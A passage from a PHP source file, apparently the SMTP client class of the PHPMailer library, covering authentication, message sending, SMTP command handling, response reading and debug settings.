                $challenge = base64_decode($challenge);
                $ntlm_res = $ntlm_client->NTLMResponse(
                    substr($challenge, 24, 8),
                    $password
                );
                //msg3
                $msg3 = $ntlm_client->TypeMsg3(
                    $ntlm_res,
                    $username,
                    $realm,
                    $workstation
                );
                // send encoded username
                return $this->sendCommand('Username', base64_encode($msg3), 235);
            case 'CRAM-MD5':
                // Start authentication
                if (!$this->sendCommand('AUTH CRAM-MD5', 'AUTH CRAM-MD5', 334)) {
                    return false;
                }
                // Get the challenge
                $challenge = base64_decode(substr($this->last_reply, 4));

                // Build the response
                $response = $username . ' ' . $this->hmac($challenge, $password);

                // send encoded credentials
                return $this->sendCommand('Username', base64_encode($response), 235);
        }
        return true;
    }

    /**
     * Calculate an MD5 HMAC hash.
     * Works like hash_hmac('md5', $data, $key)
     * in case that function is not available
     * @param string $data The data to hash
     * @param string $key  The key to hash with
     * @access protected
     * @return string
     */
    protected function hmac($data, $key)
    {
        if (function_exists('hash_hmac')) {
            return hash_hmac('md5', $data, $key);
        }

        // The following borrowed from
        // http://php.net/manual/en/function.mhash.php#27225

        // RFC 2104 HMAC implementation for php.
        // Creates an md5 HMAC.
        // Eliminates the need to install mhash to compute a HMAC
        // by Lance Rushing

        $bytelen = 64; // byte length for md5
        if (strlen($key) > $bytelen) {
            $key = pack('H*', md5($key));
        }
        $key = str_pad($key, $bytelen, chr(0x00));
        $ipad = str_pad('', $bytelen, chr(0x36));
        $opad = str_pad('', $bytelen, chr(0x5c));
        $k_ipad = $key ^ $ipad;
        $k_opad = $key ^ $opad;

        return md5($k_opad . pack('H*', md5($k_ipad . $data)));
    }

    /**
     * Check connection state.
     * @access public
     * @return boolean True if connected.
     */
    public function connected()
    {
        if (is_resource($this->smtp_conn)) {
            $sock_status = stream_get_meta_data($this->smtp_conn);
            if ($sock_status['eof']) {
                // the socket is valid but we are not connected
                if ($this->do_debug >= 1) {
                    $this->edebug(
                        'SMTP NOTICE: EOF caught while checking if connected'
                    );
                }
                $this->close();
                return false;
            }
            return true; // everything looks good
        }
        return false;
    }

    /**
     * Close the socket and clean up the state of the class.
     * Don't use this function without first trying to use QUIT.
     * @see quit()
     * @access public
     * @return void
     */
    public function close()
    {
        $this->error = array();
        $this->helo_rply = null;
        if (is_resource($this->smtp_conn)) {
            // close the connection and cleanup
            fclose($this->smtp_conn);
            if ($this->do_debug >= 3) {
                $this->edebug('Connection: closed');
            }
        }
    }

    /**
     * Send an SMTP DATA command.
     * Issues a data command and sends the msg_data to the server,
     * finializing the mail transaction. $msg_data is the message
     * that is to be send with the headers. Each header needs to be
     * on a single line followed by a <CRLF> with the message headers
     * and the message body being separated by and additional <CRLF>.
     * Implements rfc 821: DATA <CRLF>
     * @param string $msg_data Message data to send
     * @access public
     * @return boolean
     */
    public function data($msg_data)
    {
        if (!$this->sendCommand('DATA', 'DATA', 354)) {
            return false;
        }
        /* The server is ready to accept data!
         * According to rfc821 we should not send more than 1000 characters on a single line (including the CRLF)
         * so we will break the data up into lines by \r and/or \n then if needed we will break each of those into
         * smaller lines to fit within the limit.
         * We will also look for lines that start with a '.' and prepend an additional '.'.
         * NOTE: this does not count towards line-length limit.
         */

        // Normalize line breaks before exploding
        $lines = explode("\n", str_replace(array("\r\n", "\r"), "\n", $msg_data));

        /* To distinguish between a complete RFC822 message and a plain message body, we check if the first field
         * of the first line (':' separated) does not contain a space then it _should_ be a header and we will
         * process all lines before a blank line as headers.
         */

        $field = substr($lines[0], 0, strpos($lines[0], ':'));
        $in_headers = false;
        if (!empty($field) && strpos($field, ' ') === false) {
            $in_headers = true;
        }

        foreach ($lines as $line) {
            $lines_out = array();
            if ($in_headers and $line == '') {
                $in_headers = false;
            }
            // ok we need to break this line up into several smaller lines
            //This is a small micro-optimisation: isset($str[$len]) is equivalent to (strlen($str) > $len)
            while (isset($line[self::MAX_LINE_LENGTH])) {
                //Working backwards, try to find a space within the last MAX_LINE_LENGTH chars of the line to break on
                //so as to avoid breaking in the middle of a word
                $pos = strrpos(substr($line, 0, self::MAX_LINE_LENGTH), ' ');
                if (!$pos) { //Deliberately matches both false and 0
                    //No nice break found, add a hard break
                    $pos = self::MAX_LINE_LENGTH - 1;
                    $lines_out[] = substr($line, 0, $pos);
                    $line = substr($line, $pos);
                } else {
                    //Break at the found point
                    $lines_out[] = substr($line, 0, $pos);
                    //Move along by the amount we dealt with
                    $line = substr($line, $pos + 1);
                }
                /* If processing headers add a LWSP-char to the front of new line
                 * RFC822 section 3.1.1
                 */
                if ($in_headers) {
                    $line = "\t" . $line;
                }
            }
            $lines_out[] = $line;

            // Send the lines to the server
            foreach ($lines_out as $line_out) {
                //RFC2821 section 4.5.2
                if (!empty($line_out) and $line_out[0] == '.') {
                    $line_out = '.' . $line_out;
                }
                $this->client_send($line_out . self::CRLF);
            }
        }

        // Message data has been sent, complete the command
        return $this->sendCommand('DATA END', '.', 250);
    }

    /**
     * Send an SMTP HELO or EHLO command.
     * Used to identify the sending server to the receiving server.
     * This makes sure that client and server are in a known state.
     * Implements RFC 821: HELO <SP> <domain> <CRLF>
     * and RFC 2821 EHLO.
     * @param string $host The host name or IP to connect to
     * @access public
     * @return boolean
     */
    public function hello($host = '')
    {
        // Try extended hello first (RFC 2821)
        return (boolean)($this->sendHello('EHLO', $host) or $this->sendHello('HELO', $host));
    }

    /**
     * Send an SMTP HELO or EHLO command.
     * Low-level implementation used by hello()
     * @see hello()
     * @param string $hello The HELO string
     * @param string $host The hostname to say we are
     * @access protected
     * @return boolean
     */
    protected function sendHello($hello, $host)
    {
        $noerror = $this->sendCommand($hello, $hello . ' ' . $host, 250);
        $this->helo_rply = $this->last_reply;
        return $noerror;
    }

    /**
     * Send an SMTP MAIL command.
     * Starts a mail transaction from the email address specified in
     * $from. Returns true if successful or false otherwise. If True
     * the mail transaction is started and then one or more recipient
     * commands may be called followed by a data command.
     * Implements rfc 821: MAIL <SP> FROM:<reverse-path> <CRLF>
     * @param string $from Source address of this message
     * @access public
     * @return boolean
     */
    public function mail($from)
    {
        $useVerp = ($this->do_verp ? ' XVERP' : '');
        return $this->sendCommand(
            'MAIL FROM',
            'MAIL FROM:<' . $from . '>' . $useVerp,
            250
        );
    }

    /**
     * Send an SMTP QUIT command.
     * Closes the socket if there is no error or the $close_on_error argument is true.
     * Implements from rfc 821: QUIT <CRLF>
     * @param boolean $close_on_error Should the connection close if an error occurs?
     * @access public
     * @return boolean
     */
    public function quit($close_on_error = true)
    {
        $noerror = $this->sendCommand('QUIT', 'QUIT', 221);
        $err = $this->error; //Save any error
        if ($noerror or $close_on_error) {
            $this->close();
            $this->error = $err; //Restore any error from the quit command
        }
        return $noerror;
    }

    /**
     * Send an SMTP RCPT command.
     * Sets the TO argument to $toaddr.
     * Returns true if the recipient was accepted false if it was rejected.
     * Implements from rfc 821: RCPT <SP> TO:<forward-path> <CRLF>
     * @param string $toaddr The address the message is being sent to
     * @access public
     * @return boolean
     */
    public function recipient($toaddr)
    {
        return $this->sendCommand(
            'RCPT TO',
            'RCPT TO:<' . $toaddr . '>',
            array(250, 251)
        );
    }

    /**
     * Send an SMTP RSET command.
     * Abort any transaction that is currently in progress.
     * Implements rfc 821: RSET <CRLF>
     * @access public
     * @return boolean True on success.
     */
    public function reset()
    {
        return $this->sendCommand('RSET', 'RSET', 250);
    }

    /**
     * Send a command to an SMTP server and check its return code.
     * @param string $command       The command name - not sent to the server
     * @param string $commandstring The actual command to send
     * @param integer|array $expect     One or more expected integer success codes
     * @access protected
     * @return boolean True on success.
     */
    protected function sendCommand($command, $commandstring, $expect)
    {
        if (!$this->connected()) {
            $this->error = array(
                'error' => "Called $command without being connected"
            );
            return false;
        }
        $this->client_send($commandstring . self::CRLF);

        $this->last_reply = $this->get_lines();
        $code = substr($this->last_reply, 0, 3);

        if ($this->do_debug >= 2) {
            $this->edebug('SERVER -> CLIENT: ' . $this->last_reply);
        }

        if (!in_array($code, (array)$expect)) {
            $this->error = array(
                'error' => "$command command failed",
                'smtp_code' => $code,
                'detail' => substr($this->last_reply, 4)
            );
            if ($this->do_debug >= 1) {
                $this->edebug(
                    'SMTP ERROR: ' . $this->error['error'] . ': ' . $this->last_reply
                );
            }
            return false;
        }

        $this->error = array();
        return true;
    }

    /**
     * Send an SMTP SAML command.
     * Starts a mail transaction from the email address specified in $from.
     * Returns true if successful or false otherwise. If True
     * the mail transaction is started and then one or more recipient
     * commands may be called followed by a data command. This command
     * will send the message to the users terminal if they are logged
     * in and send them an email.
     * Implements rfc 821: SAML <SP> FROM:<reverse-path> <CRLF>
     * @param string $from The address the message is from
     * @access public
     * @return boolean
     */
    public function sendAndMail($from)
    {
        return $this->sendCommand('SAML', "SAML FROM:$from", 250);
    }

    /**
     * Send an SMTP VRFY command.
     * @param string $name The name to verify
     * @access public
     * @return boolean
     */
    public function verify($name)
    {
        return $this->sendCommand('VRFY', "VRFY $name", array(250, 251));
    }

    /**
     * Send an SMTP NOOP command.
     * Used to keep keep-alives alive, doesn't actually do anything
     * @access public
     * @return boolean
     */
    public function noop()
    {
        return $this->sendCommand('NOOP', 'NOOP', 250);
    }

    /**
     * Send an SMTP TURN command.
     * This is an optional command for SMTP that this class does not support.
     * This method is here to make the RFC821 Definition complete for this class
     * and _may_ be implemented in future
     * Implements from rfc 821: TURN <CRLF>
     * @access public
     * @return boolean
     */
    public function turn()
    {
        $this->error = array(
            'error' => 'The SMTP TURN command is not implemented'
        );
        if ($this->do_debug >= 1) {
            $this->edebug('SMTP NOTICE: ' . $this->error['error']);
        }
        return false;
    }

    /**
     * Send raw data to the server.
     * @param string $data The data to send
     * @access public
     * @return integer|boolean The number of bytes sent to the server or false on error
     */
    public function client_send($data)
    {
        if ($this->do_debug >= 1) {
            $this->edebug("CLIENT -> SERVER: $data");
        }
        return fwrite($this->smtp_conn, $data);
    }

    /**
     * Get the latest error.
     * @access public
     * @return array
     */
    public function getError()
    {
        return $this->error;
    }

    /**
     * Get the last reply from the server.
     * @access public
     * @return string
     */
    public function getLastReply()
    {
        return $this->last_reply;
    }

    /**
     * Read the SMTP server's response.
     * Either before eof or socket timeout occurs on the operation.
     * With SMTP we can tell if we have more lines to read if the
     * 4th character is '-' symbol. If it is a space then we don't
     * need to read anything else.
     * @access protected
     * @return string
     */
    protected function get_lines()
    {
        // If the connection is bad, give up straight away
        if (!is_resource($this->smtp_conn)) {
            return '';
        }
        $data = '';
        $endtime = 0;
        stream_set_timeout($this->smtp_conn, $this->Timeout);
        if ($this->Timelimit > 0) {
            $endtime = time() + $this->Timelimit;
        }
        while (is_resource($this->smtp_conn) && !feof($this->smtp_conn)) {
            $str = @fgets($this->smtp_conn, 515);
            if ($this->do_debug >= 4) {
                $this->edebug("SMTP -> get_lines(): \$data was \"$data\"");
                $this->edebug("SMTP -> get_lines(): \$str is \"$str\"");
            }
            $data .= $str;
            if ($this->do_debug >= 4) {
                $this->edebug("SMTP -> get_lines(): \$data is \"$data\"");
            }
            // If 4th character is a space, we are done reading, break the loop, micro-optimisation over strlen
            if ((isset($str[3]) and $str[3] == ' ')) {
                break;
            }
            // Timed-out? Log and break
            $info = stream_get_meta_data($this->smtp_conn);
            if ($info['timed_out']) {
                if ($this->do_debug >= 4) {
                    $this->edebug(
                        'SMTP -> get_lines(): timed-out (' . $this->Timeout . ' sec)'
                    );
                }
                break;
            }
            // Now check if reads took too long
            if ($endtime and time() > $endtime) {
                if ($this->do_debug >= 4) {
                    $this->edebug(
                        'SMTP -> get_lines(): timelimit reached ('.
                        $this->Timelimit . ' sec)'
                    );
                }
                break;
            }
        }
        return $data;
    }

    /**
     * Enable or disable VERP address generation.
     * @param boolean $enabled
     */
    public function setVerp($enabled = false)
    {
        $this->do_verp = $enabled;
    }

    /**
     * Get VERP address generation mode.
     * @return boolean
     */
    public function getVerp()
    {
        return $this->do_verp;
    }

    /**
     * Set debug output method.
     * @param string $method The function/method to use for debugging output.
     */
    public function setDebugOutput($method = 'echo')
    {
        $this->Debugoutput = $method;
    }

    /**
     * Get debug output method.
     * @return string
     */
    public function getDebugOutput()
    {
        return $this->Debugoutput;
    }

    /**
     * Set debug output level.
     * @param integer $level
     */
    public function setDebugLevel($level = 0)
    {
        $this->do_debug = $level;
    }

    /**
     * Get debug output level.
     * @return integer
     */
    public function getDebugLevel()
    {
        return $this->do_debug;
    }

    /**
     * Set SMTP timeout.
     * @param integer $timeout
     */
    public function setTimeout($timeout = 0)
    {
        $this->Timeout = $timeout;
    }

    /**
     * Get SMTP timeout.
     * @return integer
     */
    public function getTimeout()
    {
        return $this->Timeout;
    }
}
